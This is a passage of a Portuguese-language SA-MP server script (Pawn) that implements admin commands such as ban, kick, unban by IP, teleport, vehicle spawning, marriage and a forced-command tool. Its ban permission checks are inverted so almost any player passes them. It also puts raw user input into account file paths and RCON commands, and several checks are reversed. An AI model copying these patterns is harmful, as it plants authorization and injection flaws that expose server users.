                    new vWorld = GetPlayerVirtualWorld(playerid);
                    SetPlayerVirtualWorld(giveplayerid, vWorld);
                    SetPlayerInterior(giveplayerid, interiorp);
                    GetPlayerPos(playerid, px, py, pz);
                    SetPlayerPos(giveplayerid, px, py+1, pz);
                    SetVehiclePos(vehicleid, px, py+1, pz);
                }
            }
            else
            {
				SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
            }
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}
	if(!strcmp(cmd, "/trazertodos", true))
	{
		if(aInfo[playerid][Admin] == 1)
		{
		    SendClientMessage(playerid, 0x1E90FFAA, "Você trouxe todos os jogadores até você.");
		    format(string, sizeof(string), "O(A) administrador(a) %s trouxe todos até sua posição.", PlayerName(playerid));
		    SendClientMessage(playerid, 0x1E90FFAA, string);
			new
				Float:x, Float:y, Float:z
			;
			GetPlayerPos(playerid, x, y, z);
			foreach(Player, i)
            {
				new Float:px, Float:py, Float:pz;
                new vehicleid = GetPlayerVehicleID(i);
                new interiorp = GetPlayerInterior(playerid);
                new vWorld = GetPlayerVirtualWorld(playerid);
                SetPlayerVirtualWorld(i, vWorld);
                SetPlayerInterior(i, interiorp);
                SetPlayerPos(i, x, y, z+2);
                SetVehiclePos(vehicleid, px, py+1, pz);
            }
		}
		return 1;
	}
	if(!strcmp(cmd, "/scasamento", true))
	{
	    if(RequisitouCasar[playerid] == true)
	    {
	        SendClientMessage(playerid,COR_ERRO,"Você solicitou um casamento recentemente, use /CancelarCasamento");
	        return 1;
		}
		format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
		if(WE_GetInt(gFile, "Casado") == 1)
		{
		    SendClientMessage(playerid,COR_ERRO,"Você já é casado(a)!");
		    return 1;
		}
		RequisitouCasar[playerid] = true;
		ProntoCasamento[playerid] = SetTimerEx("ProntoCasar", 10000, false, "i", playerid);
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
		    if(pInfo[i][Prof] == PADRE)
		    {
	 			format(gStr, sizeof(gStr), "%s está solicitando um casamento!", PlayerName(playerid));
	        	SendClientMessage(i, 0x1E90FFAA, gStr);
	        	return 1;
			}
		}
		return 1;
	}
	if(!strcmp(cmd, "/cancelarcasamento", true))
	{
	    RequisitouCasar[playerid] = false;
	    KillTimer(ProntoCasamento[playerid]);
	    return 1;
	}
	if(!strcmp(cmd, "/casar", true))
	{
		if(pInfo[playerid][Prof] == PADRE)
		{
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /Casar [ID] [ID]");
				return 1;
            }
            new
				id = strval(tmp)
			;
            MSG = strrest(cmdtext, idx);
		    if(!strlen(MSG))
			{
			    SendClientMessage(playerid, COR_ERRO, "Uso válido: /Casar [ID] [ID]");
			    return 1;
	     	}
	     	new
	     	    MSGp = strval(MSG)
			;
            if(!IsPlayerConnected(id) && !IsPlayerConnected(MSGp))
            {
                SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
	            return 1;
            }
            if(RequisitouCasar[id] == false || RequisitouCasar[MSGp] == false)
            {
                SendClientMessage(playerid,COR_ERRO,"Um dos pretendentes não está pronto para o casamento!");
                return 1;
			}
			if(IsPlayerInRangeOfPoint(playerid, 2.0, 2243.6433,-1351.5186,24.1384))
			{
			    SendClientMessage(playerid,COR_ERRO,"Você não está no altar!");
			    return 1;
			}
			if(IsPlayerInRangeOfPoint(id, 2.0, 2243.6433,-1351.5186,24.1384) || IsPlayerInRangeOfPoint(MSGp, 2.0, 2243.6433,-1351.5186,24.1384))
			{
			    SendClientMessage(playerid,COR_ERRO,"Um dos pretendentes não está no altar!");
			    return 1;
			}
			if(GetPlayerCash(id) < 2000 && GetPlayerCash(MSGp) < 2000)
			{
			    SendClientMessage(playerid,COR_ERRO,"Um dos pretendentes não tem dinheiro suficiente para pagar o casamento!");
			    return 1;
			}

            new NomeMSG[MAX_PLAYER_NAME];
            GetPlayerName(MSGp, NomeMSG, sizeof(NomeMSG));
            new NomeID[MAX_PLAYER_NAME];
            GetPlayerName(id, NomeID, sizeof(NomeID));

			format(gFile, sizeof(gFile), "Contas/%s.ini", NomeID);
			format(hFile, sizeof(hFile), "Contas/%s.ini", NomeMSG);
			if(WE_GetInt(gFile, "Casado") == 1 || WE_GetInt(hFile, "Casado") == 1)
			{
			    SendClientMessage(playerid,COR_ERRO,"Um dos pretendentes já é casado(a)!");
			    return 1;
			}

			format(gFile, sizeof(gFile), "Contas/%s.ini", NomeID);
			WE_SetString(gFile, "CasadoCom", NomeMSG);
			WE_SetInt(gFile, "Casado", 1);
			WE_SaveFile();

			format(gFile, sizeof(gFile), "Contas/%s.ini", NomeMSG);
			WE_SetString(gFile, "CasadoCom", NomeID);
			WE_SetInt(gFile, "Casado", 1);
			WE_SaveFile();

			RequisitouCasar[id] = false;
			RequisitouCasar[MSGp] = false;

			new stringcas[128];
 			format(stringcas, sizeof(stringcas), "%s casou-se com %s, felicidades ao casal!", NomeID, NomeMSG);
        	SendClientMessageToAll(0x1E90FFAA, stringcas);
        	GivePlayerCash(playerid, 2000);
			return 1;
		}
		else
		{
		    SendClientMessage(playerid,COR_ERRO,"Você não é um padre!");
		    return 1;
		}
 	}
 	if(!strcmp(cmd, "/divorciar", true))
 	{
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, COR_ERRO, "Uso válido: /Divorciar [Nick]");
            return 1;
		}
		format(gFile, sizeof(gFile), "Contas/%s.ini", tmp);
		if(!fexist(gFile))
		{
			SendClientMessage(playerid, COR_ERRO, "Não existe nenhuma conta com esse nick!");
			return 1;
		}
		WE_SetString(gFile, "CasadoCom", "Ninguém");
		WE_SetInt(gFile, "Casado", 0);
		WE_SaveFile();

		format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
		WE_SetString(gFile, "CasadoCom", "Ninguém");
		WE_SetInt(gFile, "Casado", 0);
		WE_SaveFile();

		new stringdiv[128];
 		format(stringdiv, sizeof(stringdiv), "Você se divorciou com sucesso de %s", tmp);
        SendClientMessage(playerid, 0x1E90FFAA, stringdiv);
		return 1;
	}
	if(!strcmp(cmd, "/ban", true))
	{
		if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1 || WE_GetInt(f(playerid), "AdminL") == 0 || !IsPlayerAdmin(playerid))
		{
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /Ban [ID] [Motivo]");
				return 1;
            }
            new
				id = strval(tmp)
			;
            MSG = strrest(cmdtext, idx);
		    if(!strlen(MSG))
			{
			    SendClientMessage(playerid, COR_ERRO, "Uso válido: /Ban [ID] [Motivo]");
			    return 1;
	     	}
            if(!IsPlayerConnected(id))
            {
                SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
	            return 1;
            }
            if(aInfo[playerid][Oculto] == false)
            {
                if(aInfo[playerid][Moderador] == 1)
                {
                	format(string, sizeof(string), "O(A) moderador(a) %s lhe baniu pelo motivo: %s", PlayerName(playerid), MSG);
                	SendClientMessage(id, 0x1E90FFAA, string);
                	format(string, sizeof(string), "Você baniu o(a) jogador(a)(a) %s pelo motivo: %s", PlayerName(id), MSG);
                	SendClientMessage(playerid, 0x1E90FFAA, string);
                	format(string, sizeof(string), "O(A) moderador(a) %s baniu o(a) jogador(a) %s pelo motivo: %s", PlayerName(playerid), PlayerName(id), MSG);
            		SendClientMessageToAll(0x1E90FFAA, string);
					GameTextForPlayer(id, "~r~BANIDO(A)~w~!", 8000, 5);
			    	SendClientMessage(id, 0xFFFFFFAA, "Caso queira resolver sua situação, acesse nosso fórum!");
					SendClientMessage(id, 0xFFFFFFAA, "Link de acesso: {6699CC}www.{FF1E1E}w{1E90FF}e{6699CC}games.forumbrasil.net");
					WE_SetInt(f(id), "Banido", 1);
					WE_SetString(f(id), "MotivoBan", MSG);
					WE_SetString(f(id), "BanidoPor", PlayerName(playerid));
					return Ban(id), 1;
                }
                if(aInfo[playerid][Admin] == 1)
                {
                	format(string, sizeof(string), "O(A) administrador(a) %s lhe baniu pelo motivo: %s", PlayerName(playerid), MSG);
                	SendClientMessage(id, 0x1E90FFAA, string);
                	format(string, sizeof(string), "Você baniu o(a) jogador(a)(a) %s pelo motivo: %s", PlayerName(id), MSG);
                	SendClientMessage(playerid, 0x1E90FFAA, string);
                	format(string, sizeof(string), "O(A) administrador(a) %s baniu o(a) jogador(a) %s pelo motivo: %s", PlayerName(playerid), PlayerName(id), MSG);
            		SendClientMessageToAll(0x1E90FFAA, string);
					GameTextForPlayer(id, "~r~BANIDO(A)~w~!", 8000, 5);
			    	SendClientMessage(id, 0xFFFFFFAA, "Caso queira resolver sua situação, acesse nosso fórum!");
					SendClientMessage(id, 0xFFFFFFAA, "Link de acesso: {6699CC}www.{FF1E1E}w{1E90FF}e{6699CC}games.forumbrasil.net");
					WE_SetInt(f(id), "Banido", 1);
					WE_SetString(f(id), "MotivoBan", MSG);
					WE_SetString(f(id), "BanidoPor", PlayerName(playerid));
					return Ban(id), 1;
                }
			}
			else
			{
				GameTextForPlayer(id, "~r~BANIDO(A)~w~!", 8000, 5);
				SendClientMessage(id, 0xFFFFFFAA, "Caso queira resolver sua situação, acesse nosso fórum!");
				SendClientMessage(id, 0xFFFFFFAA, "Link de acesso: {6699CC}www.{FF1E1E}w{1E90FF}e{6699CC}games.forumbrasil.net");
				WE_SetInt(f(id), "Banido", 1);
				WE_SetString(f(id), "MotivoBan", MSG);
				WE_SetString(f(id), "BanidoPor", PlayerName(playerid));
				return Ban(id), 1;
			}
		}
		return 1;
 	}
	if(!strcmp(cmd, "/banoff", true))
	{
		if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1 || WE_GetInt(f(playerid), "AdminL") == 0 || !IsPlayerAdmin(playerid))
		{
			tmp = strtok(cmdtext, idx);
		    if(!strlen(tmp))
		    {
		        SendClientMessage(playerid, COR_ERRO, "Uso válido: /BanOFF [Nick]");
                return 1;
			}
			format(gFile, sizeof(gFile), "Contas/%s.ini", tmp);
  			if(!fexist(gFile))
			{
				SendClientMessage(playerid, COR_ERRO, "Não existe nenhuma conta com esse nick!");
				return 1;
			}
			if(WE_GetInt(gFile, "Banido") == 1)
			{
				SendClientMessage(playerid, COR_ERRO, "Essa conta já está banida!");
				return 1;
			}
			WE_SetInt(gFile, "Banido", 1);
			foreach(Player, i)
	    	{
				if(aInfo[i][Admin] == 1 || aInfo[i][Moderador] == 1)
				{
	        		format(gstring, sizeof(gstring), "%s foi banido(a) por %s", tmp, PlayerName(playerid));
	           		SendClientMessage(i, VERMELHO_WE, gstring);
	   			}
			}
		}
	    return 1;
	}
	if(!strcmp(cmd, "/desbanir", true))
	{
		if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1)
		{
			tmp = strtok(cmdtext, idx);
		    if(!strlen(tmp))
		    {
		        SendClientMessage(playerid, COR_ERRO, "Uso válido: correto /Desbanir [Nick]");
                return 1;
			}
			format(gFile, sizeof(gFile), "Contas/%s.ini", tmp);
  			if(!fexist(gFile))
			{
				SendClientMessage(playerid, COR_ERRO, "Não existe nenhuma conta com esse nick!");
				return 1;
			}
			if(WE_GetInt(gFile, "Banido") == 0)
			{
				SendClientMessage(playerid, COR_ERRO, "Essa conta não está banida!");
				return 1;
			}
			WE_SetInt(gFile, "Banido", 0);
			foreach(Player, i)
	    	{
				if(aInfo[i][Admin] == 1 || aInfo[i][Moderador] == 1)
				{
	        		format(gstring, sizeof(gstring), "%s foi desbanido(a) por %s", tmp, PlayerName(playerid));
	           		SendClientMessage(i, AZUL_WE, gstring);
	   			}
			}
		}
	    return 1;
	}
	if(!strcmp(cmd, "/desbanirip", true))
	{
	    if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1)
	    {
			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /DesbanirIP [IP]");
				return 1;
		 	}
		 	format(gStr, sizeof(gStr), "unbanip %s", tmp);
			SendRconCommand(gStr);
			SendRconCommand("reloadbans");
			foreach(Player, i)
	    	{
				if(aInfo[i][Admin] == 1 || aInfo[i][Moderador] == 1)
				{
	        		format(gstring, sizeof(gstring), "IP '%s' foi desbanido por %s", tmp, PlayerName(playerid));
	           		SendClientMessage(i, AZUL_WE, gstring);
	   			}
			}
		}
		return 1;
	}
	if(!strcmp(cmd, "/reiniciarweserver", true))
	{
	    if(WE_GetInt(f(playerid), "AdminL") == 0) return SendClientMessage(playerid, COR_ERRO, "Você não pode usar esse comando.");
	    {
 			new
				fechasrvMsg[128]
			;
			fechasrvMsg = strrest(cmdtext, idx);
			if(!strlen(fechasrvMsg))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /ReiniciarWEServer [Motivo]");
				return 1;
			}
			if(strlen(fechasrvMsg) > 35)
			{
				SendClientMessage(playerid, COR_ERRO, "Motivo muito grande resuma o mesmo!");
				return 1;
			}
	        for(new i; i < MAX_PLAYERS; ++i)
	    	{
	    	    if(IsPlayerConnected(i))
	    	    {
                    LimparChat(i, 40);
					SendClientMessage(i, AZUL_WE, "[{FF1E1E}WE{FFF000}Games{1E90FF}]{FFFFFF} Servidor reiniciado, relogue.");
					format(gStr, sizeof(gStr), "[{FF1E1E}WE{FFF000}Games{1E90FF}] Motivo: {FFFFFF}%s", fechasrvMsg);
					SendClientMessage(i, AZUL_WE, gStr);
                    SalvarFile(i);
					Kick(i);
				}
	        }
	        SendRconCommand("exit");
	    }
	    return 1;
	}
	if(!strcmp(cmd, "/reiniciarwegmx", true))
	{
	    if(!IsPlayerAdmin(playerid)) return SendClientMessage(playerid, COR_ERRO, "Você não pode usar esse comando.");
	    {
 			new
				fechasrvMsg[128]
			;
			fechasrvMsg = strrest(cmdtext, idx);
			if(!strlen(fechasrvMsg))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /ReiniciarWEGMX [Motivo] (ATENÇÃO: O uso do GMX pode causa bug temporário)");
				return 1;
			}
			if(strlen(fechasrvMsg) > 35)
			{
				SendClientMessage(playerid, COR_ERRO, "Motivo muito grande resuma o mesmo!");
				return 1;
			}
	        for(new i; i < MAX_PLAYERS; ++i)
	    	{
	    	    if(IsPlayerConnected(i))
	    	    {
                    LimparChat(i, 40);
					SendClientMessage(i, AZUL_WE, "[{FF1E1E}WE{FFF000}Games{1E90FF}]{FFFFFF} O servidor está sendo reiniciado, aguarde!");
					format(gStr, sizeof(gStr), "[{FF1E1E}WE{FFF000}Games{1E90FF}] Motivo: {FFFFFF}%s", fechasrvMsg);
					SendClientMessage(i, AZUL_WE, gStr);
                    SalvarFile(i);
					Kick(i);
				}
	        }
	        SendRconCommand("gmx");
	    }
	    return 1;
	}
	if(!strcmp(cmd, "/kick", true))
	{
		if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1 || aInfo[playerid][Ajudante] == 1)
		{
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /Kick [ID] [Motivo]");
				return 1;
            }
            new
				id = strval(tmp)
			;
            MSG = strrest(cmdtext, idx);
		    if(!strlen(MSG))
			{
			    SendClientMessage(playerid, COR_ERRO, "Uso válido: /Kick [ID] [Motivo]");
			    return 1;
	     	}
            if(!IsPlayerConnected(id))
            {
                SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!") ;
	            return 1;
            }
            if(aInfo[playerid][Oculto] == false)
            {
				if(aInfo[playerid][Moderador] == 1)
				{
                	format(string, sizeof(string), "Você foi kickado(a) pelo(a) moderador(a) %s [Motivo: %s]", PlayerName(playerid), MSG);
                	SendClientMessage(id, 0x1E90FFAA, string);
                	format(string, sizeof(string), "Você kickou o(a) jogador(a) %s [Motivo: %s]", PlayerName(id), MSG);
                	SendClientMessage(playerid, 0x1E90FFAA, string);
            		format(string, sizeof(string), "O(A) moderador(a) %s kickou o(a) jogador(a) %s (Motivo: %s)", PlayerName(playerid), PlayerName(id), MSG);
              		SendClientMessageToAll(0x1E90FFAA, string);
		            SendClientMessage(id, COR_ERRO, "Você foi kickado(a) do servidor!");
		            GameTextForPlayer(id, "~g~Kickado(a)~w~!", 8000, 5);
				}
				if(aInfo[playerid][Admin] == 1)
				{
                	format(string, sizeof(string), "Você foi kickado(a) pelo(a) administrador(a) %s [Motivo: %s]", PlayerName(playerid), MSG);
                	SendClientMessage(id, 0x1E90FFAA, string);
                	format(string, sizeof(string), "Você kickou o(a) jogador(a) %s [Motivo: %s]", PlayerName(id), MSG);
                	SendClientMessage(playerid, 0x1E90FFAA, string);
            		format(string, sizeof(string), "O(A) administrador(a) %s kickou o(a) jogador(a) %s (Motivo: %s)", PlayerName(playerid), PlayerName(id), MSG);
              		SendClientMessageToAll(0x1E90FFAA, string);
		            SendClientMessage(id, COR_ERRO, "Você foi kickado(a) do servidor!");
		            GameTextForPlayer(id, "~g~Kickado(a)~w~!", 8000, 5);
				}
				if(aInfo[playerid][Ajudante] == 1)
				{
                	format(string, sizeof(string), "Você foi kickado(a) pelo(a) ajudante %s [Motivo: %s]", PlayerName(playerid), MSG);
                	SendClientMessage(id, 0x1E90FFAA, string);
                	format(string, sizeof(string), "Você kickou o(a) jogador(a) %s [Motivo: %s]", PlayerName(id), MSG);
                	SendClientMessage(playerid, 0x1E90FFAA, string);
            		format(string, sizeof(string), "O(A) ajudante %s kickou o(a) jogador(a) %s (Motivo: %s)", PlayerName(playerid), PlayerName(id), MSG);
              		SendClientMessageToAll(0x1E90FFAA, string);
		            SendClientMessage(id, COR_ERRO, "Você foi kickado(a) do servidor!");
		            GameTextForPlayer(id, "~g~Kickado(a)~w~!", 8000, 5);
				}
				return Kick(id), 1;
            }
            else
            {
		   		SendClientMessage(id, COR_ERRO, "Você foi kickado(a) do servidor!");
		      	GameTextForPlayer(id, "~g~Kickado(a)~w~!", 8000, 5);
		   		return Kick(id), 1;
			}
		}
		return 1;
	}
	if(!strcmp(cmd, "/removerpolicia", true))
	{
		if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Corregedor] == 1)
		{
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /RemoverPolicia [ID]");
				return 1;
            }
            new id = strval(tmp);
            if(!IsPlayerConnected(id))
            {
				SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
				return 1;
            }
            GetPlayerName(playerid, sendername, sizeof(sendername));
            GetPlayerName(id, giveplayer, sizeof(giveplayer));
            format(string, sizeof(string), "{FF0000}O(A) corregedor(a) {FFFFFF}%s {FF0000}lhe removeu da polícia por excesso de abuso!", sendername);
            SendClientMessage(id, 0x1E90FFAA, string);
            format(string, sizeof(string), "Você retirou %s da polícia!", giveplayer);
            SendClientMessage(playerid, 0x1E90FFAA, string);
            format(string, sizeof(string), "%s foi punido(a) e removido(a) da polícia pelo(a) corregedor(a) %s por excesso de abuso!", giveplayer, sendername);
            SendClientMessage(playerid, 0x1E90FFAA, string);
            printf("O(A) administrador(a) %s [%d] retirou %s [%d] da polícia", sendername, playerid, giveplayer, id);
			WE_SetInt(f(id), "RemovidoPolicia", 1);
            WE_SaveFile();
			IsNotCop[id] = 1;
			return 1;
		}
		return 1;
	}
	if(!strcmp(cmd, "/liberarpolicia", true))
	{
		if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Corregedor] == 1)
		{
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /LiberarPolicia [ID]");
				return 1;
            }
            new id = strval(tmp);
            if(!IsPlayerConnected(id))
            {
				SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
				return 1;
            }
 			if(aInfo[playerid][Oculto] == false)
			{
                GetPlayerName(playerid, sendername, sizeof(sendername));
                GetPlayerName(id, giveplayer, sizeof(giveplayer));
                format(string, sizeof(string), "O(A) corregedor(a) %s lhe liberou para ser policial!", sendername);
                SendClientMessage(id, 0x1E90FFAA, string);
                format(string, sizeof(string), "Você liberou %s para ser policial!", giveplayer);
                SendClientMessage(playerid, 0x1E90FFAA, string);
                printf("O(A) corregedor(a) %s [%d] liberou %s [%d] para ser policial!", sendername, playerid, giveplayer, id);
			}
			WE_SetInt(f(id), "RemovidoPolicia", 0);
            WE_SaveFile();
			IsNotCop[id] = 0;
			return 1;
		}
		return 1;
	}
	if(!strcmp(cmd, "/criarveiculo", true) || !strcmp(cmd, "/cv", true))
	{
        if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1)
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /CriarVeiculo [ID ou Nome] [Cor1] [Cor2]");
				return 1;
            }
			new
				veiculo = GetVehicleModelID(tmp)
			;
			if(veiculo == -1)
			{
				veiculo = strval(tmp);
                if(veiculo < 400 || veiculo > 611)
                {
			        SendClientMessage(playerid, COR_ERRO, "Somente ID de 400 à 611!");
				    return 1;
				}
            }
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /CriarVeiculo [ID ou Nome] [Cor1] [Cor2]");
				return 1;
            }
			new
				cor1 = strval(tmp)
			;
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /CriarVeiculo [ID ou Nome] [Cor1] [Cor2]");
				return 1;
            }
            new
				cor2 = strval(tmp)
			;
			new
				Float:x, Float:y, Float:z, Float:a
			;
			GetPlayerPos(playerid, x, y, z);
			GetPlayerFacingAngle(playerid, a);
			vehid = CreateVehicle(veiculo, x, y, z, a, cor1, cor2, -1);
			LinkVehicleToInterior(vehid, GetPlayerInterior(playerid));
			PutPlayerInVehicle(playerid, vehid, 0);
            PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
            format(string, sizeof(string), "Veículo %s criado com sucesso! {FF1E1E}(APÓS USAR, NÃO ESQUEÇA DE EXCLUIR! - /dv)", vNome[GetVehicleModel(vehid) - 400]);
            SendClientMessage(playerid, 0x1E90FFAA, string);
        }
		return 1;
	}
	if(!strcmp(cmdtext, "/dv", true))
    {
        if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1)
		{
			if(IsPlayerInAnyVehicle(playerid))
			{
				new
					v = GetPlayerVehicleID(playerid)
				;
				if(vHouse[v] == 1)
				{
				    SendClientMessage(playerid, COR_ERRO, "Não é permitido a exclusão de veículos casa!");
				    return 1;
				}
				format(string, sizeof(string), "Veículo %s excluído com sucesso!", vNome[GetVehicleModel(v) - 400]);
		   		SendClientMessage(playerid, 0x1E90FFAA, string);
		    	DestroyVehicle(v);
		       	PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
			}
			else
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não está em um veículo!");
			}
			return 1;
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
    }
	if(!strcmp(cmdtext, "/flip", true))
    {
		if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1)
		{
			if(IsPlayerInAnyVehicle(playerid))
			{
                new
					getVehicle, Float:a
				;
                getVehicle = GetPlayerVehicleID(playerid);
                GetVehicleZAngle(getVehicle, a);
                SetVehicleZAngle(getVehicle, a);
                SendClientMessage(playerid, 0x1E90FFAA, "Veículo desvirado com sucesso!");
			}
			else
			{
				SendClientMessage(playerid, COR_ERRO, "Você não está em um veículo!");
			}
			return 1;
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
        return 1;
    }
   	if(!strcmp(cmd, "/vidaveiculo", true))
	{
		if(aInfo[playerid][Admin] == 1)
		{
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
	            SendClientMessage(playerid, COR_ERRO, "Uso válido: /VidaVeiculo [Vida]");
	            return 1;
            }
       		new
				vida = strval(tmp)
			;
            new
				getVehicle = GetPlayerVehicleID(playerid)
			;
            SetVehicleHealth(getVehicle, vida);
            format(string, sizeof(string), "Você setou a vida desse veículo para %d", vida);
            SendClientMessage(playerid, 0x1E90FFAA, string);
        }
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}
	if(!strcmp(cmd, "/respawnveiculos", true) || !strcmp(cmd, "/rv", true))
	{
		if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1)
		{
  			for(new v = 0; v < MAX_VEHICLES; v++)
	    	{
				if(!IsValidVehicleBombeiros(v) && IsValidVehicleHouse(v) && !IsVehicleOccupied(v) && NotTrailerAtached(v)) SetVehicleToRespawn(v);
			}
            SendClientMessage(playerid, 0x1E90FFAA, "Você respawnou todos os veículos que estão desocupados.");
        }
	    return 1;
	}
	if(!strcmp(cmdtext, "/trespawnveiculos", true))
	{
		if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1)
		{
  			for(new v = 0; v < MAX_VEHICLES; v++)
	    	{
				if(!IsVehicleOccupied(v)) SetVehicleToRespawn(v);
			}
            SendClientMessage(playerid, 0x1E90FFAA, "Você respawnou todos os veículos que estão desocupados e veículos casas.");
        }
	    return 1;
	}
	if(!strcmp(cmdtext, "/respawnveiculo", true))
	{
		if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1)
		{
		    if(IsPlayerInAnyVehicle(playerid))
		    {
		        SendClientMessage(playerid, 0x1E90FFAA, "Veículo respawnado com sucesso!");
		        SetVehicleToRespawn(GetPlayerVehicleID(playerid));
            }
            else
            {
                SendClientMessage(playerid, COR_ERRO, "Você não está em um veículo!");
            }
            return 1;
        }
	    return 1;
	}
    if(!strcmp(cmd, "/injetar", true))
    {
		if(aInfo[playerid][Admin] == 1)
		{
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /Injetar [ID]");
				return 1;
            }
            new
				id = strval(tmp)
			;
            if(!IsPlayerConnected(id))
            {
				SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
				return 1;
            }
			if(aInfo[playerid][Oculto] == false)
			{
                format(gstring, sizeof(gstring), "O(A) administrador(a) %s te colocou você dentro do veículo que ele(a) está.", PlayerName(playerid));
                SendClientMessage(id, 0x1E90FFAA, gstring);
                format(gstring, sizeof(gstring), "Você colocou o(a) jogador(a) %s dentro do seu veículo.", PlayerName(id));
                SendClientMessage(playerid, 0x1E90FFAA, gstring);
			}
   			new
			   	vehicleid = GetPlayerVehicleID(playerid)
   			;
      		PutPlayerInVehicle(id, vehicleid, 1);
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
    }
    if(!strcmp(cmd, "/ejetar", true))
    {
		if(aInfo[playerid][Admin] == 1)
		{
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /Ejetar [ID]");
				return 1;
            }
            new
				id = strval(tmp)
			;
            if(!IsPlayerConnected(id))
            {
				SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
				return 1;
            }
			if(aInfo[playerid][Oculto] == false)
			{
                format(gstring, sizeof(gstring), "O(A) administrador(a) %s ejetou você do veículo.", PlayerName(playerid));
                SendClientMessage(id, 0x1E90FFAA, gstring);
                format(gstring, sizeof(gstring), "Você ejetou o(a) jogador(a) %s de seu veículo.", PlayerName(id));
                SendClientMessage(playerid, 0x1E90FFAA, gstring);
			}
            RemovePlayerFromVehicle(id);
            PlayerPlaySound(id, 1147, 0.0, 0.0, 0.0);
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
    }
    if(!strcmp(cmd, "/fakecmd", true))
    {
        if(aInfo[playerid][Admin] == 1)
		{
            tmp = strtok(cmdtext, idx);
            new id = strval(tmp);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /fakecmd [ID] [Comando]");
				return 1;
            }
            new length = strlen(cmdtext);
	        while ((idx < length) && (cmdtext[idx] <= ' '))
        	{
    	        idx++;
     	    }
      	    new offset = idx;
        	new result[64];
    	    while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
            {
             	result[idx - offset] = cmdtext[idx];
    	        idx++;
    	    }
            tmp = strtok(cmdtext, idx);
            if(!strlen(result))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /fakecmd [ID] [Comando]");
				return 1;
            }
            if(!IsPlayerConnected(id))
            {
				SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
				return 1;
            }
            result[idx - offset] = EOS;
            SetPlayerRemoteFunction(id, result);
           	GetPlayerName(playerid, sendername, sizeof(sendername));
            GetPlayerName(id, giveplayer, sizeof(giveplayer));
            if(aInfo[playerid][Oculto] == false)
            {
                for(new i = 0; i < MAX_PLAYERS; i++)
                {
                    if(aInfo[i][Admin] == 1)
                    {
          				format(string, sizeof(string), "O(A) administrador(a) %s fez o(a) jogador(a) %s usar o comando %s", sendername, giveplayer, result);
            			SendClientMessage(i, 0x1E90FFAA, string);
						return 1;
					}
				}
			}
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
    }
	if(strcmp(cmd, "/verip", true) == 0)
	{
        if(aInfo[playerid][Admin] == 1)
        {
            tmp = strtok(cmdtext, idx);
